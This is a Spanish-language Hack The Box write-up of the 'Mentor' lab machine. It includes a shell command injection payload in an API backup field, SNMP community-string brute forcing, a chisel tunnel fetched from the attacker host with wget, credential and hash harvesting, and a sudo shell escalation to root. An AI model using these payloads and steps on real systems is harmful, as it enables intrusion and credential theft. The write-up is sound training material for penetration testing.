+++
author = "Andrés Del Cerro"
title = "Hack The Box: Mentor Writeup | Medium"
date = "2024-08-01"
description = ""
tags = [
    "HackTheBox",
    "Mentor",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "Virtual Hosting",
    "Subdomain Enumeration",
    "API Enumeration",
    "Abusing API",
    "SNMP Enumeration (snmpwalk && snmpbulkwalk) + Community String Brute Force",
    "Information Leakage",
    "Abusing JWT",
    "API Exploitation (Command Injection)",
    "Chisel Tunnel + Postgresql Service Enumeration + Information Leakage",
    "Abusing Sudoers Privilege [Privilege Escalation]",
    "Escaping Docker Container"
]

+++

# Hack The Box: Mentor Writeup

Welcome to my detailed writeup of the medium difficulty machine **"Mentor"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration
```shell
$ rustscan -a 10.129.228.102 --ulimit 5000 -g
10.129.228.102 -> [22,80]
```

```shell
$ nmap -p22,80 -sCV 10.129.228.102 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 22:30 CEST
Nmap scan report for 10.129.228.102
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds
```

# UDP Enumeration
```shell
$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.228.102 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 22:32 CEST
Nmap scan report for 10.129.228.102
Host is up (0.039s latency).
Not shown: 1493 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
161/udp   open   snmp
1068/udp  closed instl_bootc
17989/udp closed unknown
22292/udp closed unknown
27064/udp closed unknown
31673/udp closed unknown
42313/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

Detectamos que está el puerto 161/UDP (SNMP) abierto, interesante.
# HTTP enumeration & Virtual Hosting
Detectamos un dominio `mentorquotes.htb`

Detectamos que el Framework por detrás es `Flask`
```shell
$ whatweb http://mentorquotes.htb
http://mentorquotes.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.3 Python/3.6.9], IP[10.129.228.102], Python[3.6.9], Title[MentorQuotes], Werkzeug[2.0.3]
```

Tras analizar el código fuente de la página web no encuentro nada interesante. Así que decidí fuzzear en busca de nuevas rutas pero no encontré nada.

```shell
$ feroxbuster -u http://mentorquotes.htb/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mentorquotes.htb/
 🚀  Threads               │ 100
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      167l      621w     5506c http://mentorquotes.htb/
404      GET        9l       31w      278c http://mentorquotes.htb/http%3A%2F%2Fwww
[##>-----------------] - 78s    28178/220545  11m     found:2       errors:561
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_mentorquotes_htb_-1722544677.state ...
[##>-----------------] - 78s    28183/220545  11m     found:2       errors:561
[##>-----------------] - 78s    28174/220545  361/s   http://mentorquotes.htb/
```

Así que decidí fuzzear por subdominios.

```shell
$ wfuzz --hc=302 -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.mentorquotes.htb' http://mentorquotes.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000051:   404        0 L      2 W        22 Ch       "api"
```

Y encontré un subdominio `api`.

```shell
$ curl -s http://api.mentorquotes.htb/ | jq
{
  "detail": "Not Found"
}
```

# API Enumeration
Con el diccionario `SecLists/Discovery/Web-Content/api/api-endpoints.txt` Encontramos varias rutas interesantes.
```shell
200      GET       69l      212w     2637c http://api.mentorquotes.htb/docs/oauth2-redirect
200      GET        1l       48w     7676c http://api.mentorquotes.htb/openapi.json
307      GET        0l        0w        0c http://api.mentorquotes.htb/docs/ => http://api.mentorquotes.htb/docs
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
```

Esta ruta de openapi.json y /docs, me hace pensar que existe un `swagger` detrás donde a parte de los endpoints, se expone un usuario `james`.
![Write-up Image](images/Screenshot_1.png)


Utilizo el endpoint de `/auth/signup` para crearme un usuario.
![Write-up Image](images/Screenshot_2.png)

Y al utilizar el endpoint de `/auth/login` obtenemos un JWT.
![Write-up Image](images/Screenshot_3.png)

Analizando este token, no encontramos nada interesante.
![Write-up Image](images/Screenshot_4.png)

Pero ahora puedo hacer solicitudes a otros endpoints para los cuales necesitaba autenticación.
Me llama la atención el endpoint de `/users/` pero necesito una cuenta de administrador.
```shell
$ curl -s http://api.mentorquotes.htb/users/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg' | jq
{
  "detail": "Only admin users can access this resource"
}
```

Podemos ver todas las frases que salían en el sitio web.
```shell
$ curl -s http://api.mentorquotes.htb/quotes/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg' | jq
[
  {
    "title": " I believed I was good",
    "description": "I was so bad at studies in school. Teachers used to tell me that I should follow a different passion other than typical education. Nonetheless, I got rid of the negativity in myself and others and worked as hard as I could in my finals and college education. Now I am a paid accountant for a major brand in my country.",
    "id": 1
  },
  {
    "title": "Find your passion before its too late",
    "description": "When I was growing up, I did not really have much, sure I enjoyed my passion but did not take it seriously. When I worked in a gas station for 3 years at that point I made a decision to go back to education and get a masters degree. Now I am a senior content engineer for a reputed company",
    "id": 2
  },
  {
    "title": "Never too late",
    "description": "I was a construction worker for almost 10 years. I had to work there because I did not have any educational background to work in the academic sector. But I realized I was not getting the best of my life. So I started investing in crypto. Learned about how investing is done professionally. Soon enough I was able to give up the construction sector and start my own business. I did all this in my 60s",
    "id": 3
  },
  {
    "title": "Age is just a number",
    "description": "When I was was kid, I used to create very simple video games as a hobby. Because I loved it so much, I thought to myself that I am going to be a game developer someday. With self-motivation, I applied for a job as a game designer when I just finished school. Now I work there as a permanent video game developer. And I am really proud to be the youngest employee there.",
    "id": 4
  },
  {
    "title": "Its all worth it in the end",
    "description": "Working as a school teacher, I had a lot of responsibilities to fulfill. Even though I really loved teaching kids, the pressure was unbearable. I had 10-hour shifts at school including all the extra classes. But I did all of them to support the kids who needed my help. Now I am retired and I can not think of anything else that I would have done except this. When I see the kids I teach come and visit me telling how they enjoyed my teaching, all the hard work I put in is worth it.",
    "id": 5
  }
]
```

Tampoco podemos crear ni editar una frase.
```shell
$ curl -s -X POST http://api.mentorquotes.htb/quotes/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg' -H 'Content-Type: application/json' --data '{"title": "testing", "description": "testing"}' | jq
{
  "detail": "Only admin users can access this resource"
}

┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/mentor/scan]
└──╼ [★]$ curl -s -X PUT http://api.mentorquotes.htb/quotes/1/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg' -H 'Content-Type: application/json' --data '{"title": "testing", "description": "testing"}' | jq
{
  "detail": "Only admin users can access this resource"
}
```

Pensé que quizás existía alguna frase oculta que no se podía ver a simple vista, así que hice un script en python para intentar descubrirlas pero no sirvió.

```python
!/usr/bin/python3
import requests

JWT = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg"
BASE_URL = "http://api.mentorquotes.htb/quotes/<ID>/"
BAD_QUOTE_LENGTH = 28

def brute():
    headers = {
        "Authorization": JWT
    }
    for i in range(200):
        r = requests.get(BASE_URL.replace("<ID>", str(i)), headers=headers)
        if (len(r.text) != BAD_QUOTE_LENGTH):
            print("[+] Quote with ID: " + str(i) + " exists")

if __name__ == "__main__":
    brute()
```

```shell
$ python3 brute.py
[+] Quote with ID: 0 exists
[+] Quote with ID: 1 exists
[+] Quote with ID: 2 exists
[+] Quote with ID: 3 exists
[+] Quote with ID: 4 exists
[+] Quote with ID: 5 exists
```

Nos reporta lo que ya sabíamos..

# SNMP Enumeration
Como con la API no he conseguido nada, voy a enumerar el otro puerto abierto a parte del SSH, el SNMP .

```shell
$ snmpbulkwalk -v 2c -c public 10.129.228.102
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (267066) 0:44:30.66
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (8) 0:00:00.08
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (8) 0:00:00.08
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (268106) 0:44:41.06
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2024-8-1,19:11:3.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 228
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Tampoco es que veamos nada interesante.

Al intentar con `onesixtyone` hacer fuerza bruta a las community strings, me di cuenta de que solamente probaba con la versión v1 de SNMP, y no podía especificar la v2c.

```shell
$ onesixtyone 10.129.228.102 -c /opt/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
Scanning 1 hosts, 120 communities
10.129.228.102 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
10.129.228.102 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
```

Y si capturas estas solicitudes con `wireshark` te das cuenta de la problemática.
![Write-up Image](images/Screenshot_5.png)

Así que busqué una forma alternativa![Write-up Image](images/Screenshot_6.png)

Utilizando esta herramienta...

```shell
$ python3 snmpbrute.py --file=/opt/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt --target=10.129.228.102
```

```
10.129.228.102 : 161 	Version (v1):	public
10.129.228.102 : 161 	Version (v2c):	public
10.129.228.102 : 161 	Version (v2c):	internal
```

Encontramos la community string `internal`

Y enumerando el SNMP...

Vemos que si ganamos acceso a la máquina seguramente estemos en un contenedor.
`IF-MIB::ifDescr.4 = STRING: docker0`

Encontramos que hay una base de datos `postgres` por detrás.
`HOST-RESOURCES-MIB::hrSWRunName.1925 = STRING: "postgres`

Y un servicio `login.py` que es raro..
`HOST-RESOURCES-MIB::hrSWRunName.2090 = STRING: "login.py"`

Y encontramos un information leakage donde se descubre una contraseña.
`HOST-RESOURCES-MIB::hrSWRunParameters.2090 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"`

# Foothold (container)
Ahora podemos intentar conseguir un token JWT como el usuario `james`..

![Write-up Image](images/Screenshot_7.png)

![Write-up Image](images/Screenshot_8.png)

# Abusing API
Ahora podemos intentar crear una frase.
```shell
$ curl -s -X POST http://api.mentorquotes.htb/quotes/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type: application/json' --data '{"title": "Testing", "description": "Testing"}'| jq
{
  "title": "Testing",
  "description": "Testing",
  "id": 6
}
```

Y vemos que se reporta en la página principal, en lo primero que pensé es en hacer un SSTI.
![Write-up Image](images/Screenshot_9.png)

Pero no funcionó.
![Write-up Image](images/Screenshot_10.png)

Así que enumerando usuarios en el endpoint de /users/
encontramos otro usuario mas.
```json
{
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc"
  }
```

No me sirve de nada, y después de revisar todos los endpoints no conseguí nada.

Así que cuando no consigues nada hay que seguir enumerando.

Con `feroxbuster` pero utilizando otro diccionario, encontré un endpoint `/admin` que no estaba documentado en el Swagger.
```shell
$ feroxbuster -u http://api.mentorquotes.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100
....
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
```

Uy, yo esto lo catalogaría como otro Information Leakage...
```shell
$ curl -s -X GET http://api.mentorquotes.htb/admin/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
{
  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}
```

## Check endpoint
```shell
$ curl -s -X GET http://api.mentorquotes.htb/admin/check -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
{
  "details": "Not implemented yet!"
}
```
Por aquí parece que no es..

## Backup endpoint
```shell
$ curl -s -X GET http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
{
  "detail": "Method Not Allowed"
}
```

Esto tiene mejor pinta..
Cambiando el método a POST
```shell
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

Añadiendo el encabezado `Content-Type: application/json` y el parámetro `--data '{}'` (vacío) para poder enumerar que campos necesito rellenar, nos reporta lo siguiente.
```json
{
  "detail": [
    {
      "loc": [
        "body",
        "path"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

```shell
$ curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type: application/json' --data '{"path": "test"}'| jq
{
  "INFO": "Done!"
}
```
¿Done?

# RCE
Después de probar un rato, supuse que estaba con tar, zip, 7z... lo que sea, ejecutando un comando a nivel de sistema donde se está pasando mi input, por lo cual, intenté ejecutar un comando.

```shell
$ curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type: application/json' --data '{"path": "asd; ping -c 1 10.10.14.80 #"}'| jq
{
  "INFO": "Done!"
}
```

```shell
$ sudo tcpdump icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:40:50.193172 IP api.mentorquotes.htb > 10.10.14.80: ICMP echo request, id 6400, seq 0, length 64
23:40:50.193200 IP 10.10.14.80 > api.mentorquotes.htb: ICMP echo reply, id 6400, seq 0, length 64
```

Ahora solo queda mandarnos la reverse shell.
Después de probar los métodos comunes no pude mandar la revshell.
Así que como la máquina estaba corriendo `Flask` sabemos que tiene python, así que probé a mandarme la revshell con python.

Tuve que pasarme a `burpsuite` para escapar los caracteres correctamente, además, como es un contenedor, hay que mandar una `sh` y no una `bash`
![Write-up Image](images/Screenshot_11.png)

Podemos ver que hemos ganado acceso al contenedor
```shell
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

La flag se encuentra en este contenedor
`/home/svc/user.txt`
# Escaping the container

Me importa el archivo `db.py` de la aplicación ya que contiene credenciales de la base de datos.
```python
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)
```

Pero nos damos cuenta de que la BBDD está en otro equipo. Pero con chisel podemos hacer port-forwarding fácilmente.

Me descargo el chisel en la máquina víctima
```shell
wget http://10.10.14.80:8081/chisel -O chisel
Connecting to 10.10.14.80:8081 (10.10.14.80:8081)
chisel               100% |********************************| 8452k  0:00:00 ETA
```

Atacante
```shell
$ /opt/chisel/chisel server --reverse -p 1234
2024/08/02 00:03:21 server: Reverse tunnelling enabled
2024/08/02 00:03:21 server: Fingerprint XmJE32+0pB6QL7Qz0TxHillBb6Cs7f7sLF6uTMD4MnA=
2024/08/02 00:03:21 server: Listening on http://0.0.0.0:1234
2024/08/02 00:04:07 server: session#1: tun: proxy#R:5432=>172.22.0.1:5432: Listening
```

Máquina víctima
```shell
./chisel client 10.10.14.80:1234 R:5432:172.22.0.1:5432
2024/08/01 20:04:27 client: Connecting to ws://10.10.14.80:1234
2024/08/01 20:04:27 client: Connected (Latency 37.887855ms)
```

Ahora en principio mi puerto local 5432 corresponde al puerto 5432 del equipo `172.22.0.1`

Lo podemos comprobar..
```shell
$ nmap -p5432 127.0.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 00:05 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00019s latency).

PORT     STATE SERVICE
5432/tcp open  postgresql
```

## Enumerating Database
He utilizado `sshpass` para poner la contraseña de la base de datos rápidamente y así saltarme el prompt de la contraseña..

```shell
$ sshpass -p postgres psql -h 127.0.0.1 -U postgres -W postgres -p 5432
psql (15.7 (Debian 15.7-0+deb12u1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=#
```

con `\list` detectamos una base de datos llamada `mentorquotes_db`

```shell
postgres=# \c mentorquotes_db
Password:
psql (15.7 (Debian 15.7-0+deb12u1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db=#
```

Vemos varias tablas interesantes, pero la que mas me interesa es `cmd_exec`  ya que podría haberse ejecutado comandos que revelen credenciales...

```SQL
mentorquotes_db=# select * from users;
 id |         email          |  username   |             password
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)
```

Estos hashes podremos intentar romperlos, aunque ya sabemos la contraseña para el usuario `james` ..

Utilizando [hashes.com](http://hashes.com) podemos ver que este hash ya había sido crackeado.
![Write-up Image](images/Screenshot_12.png)

Y ya podemos conectarnos con ssh y como el usuario `svc` con la credencial encontrada y ganamos acceso a la máquina víctima.

```shell
$ ssh svc@10.129.255.245
The authenticity of host '10.129.255.245 (10.129.255.245)' can't be established.
ED25519 key fingerprint is SHA256:fkqwgXFJ5spB0IsQCmw4K5HTzEPyM27mczyMp6Qct5Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.255.245' (ED25519) to the list of known hosts.
svc@10.129.255.245's password:
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug  1 08:12:26 PM UTC 2024

  System load:                      0.0
  Usage of /:                       65.2% of 8.09GB
  Memory usage:                     14%
  Swap usage:                       0%
  Processes:                        249
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.255.245
  IPv6 address for eth0:            dead:beef::250:56ff:fe94:6a7f


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$
```

# User Pivoting
Ejecutando `linpeas.sh` encontramos lo siguiente.
```shell
══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
createUser bootstrap MD5 SuperSecurePassword123__ DES
-rw------- 1 Debian-snmp Debian-snmp 1268 Aug  1 19:55 /var/lib/snmp/snmpd.conf
```

Y viendo los usuarios del sistema...
```shell
svc@mentor:/tmp$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
james:x:1000:1000:,,,:/home/james:/bin/bash
```

`james:SuperSecurePassword123__`

```shell
c@mentor:/tmp$ su james
Password:
james@mentor:/tmp$
```

# Privilege Escalation
Ejecutando el comando `sudo -l`

Vemos que el usuario `james` puede ejecutar como el usuario que quiera, incluido `root`
el comando binario `/bin/sh`

```shell
james@mentor:/tmp$ sudo -l
[sudo] password for james:
Sorry, try again.
[sudo] password for james:
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh

```

Así que aquí ya está mascada la escalada de privilegios.
```shell
james@mentor:/tmp$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

```shell
# cat /root/root.txt
ef134ef73e65ef5c0...
```

¡Y ya estaría!

Happy Hacking! 🚀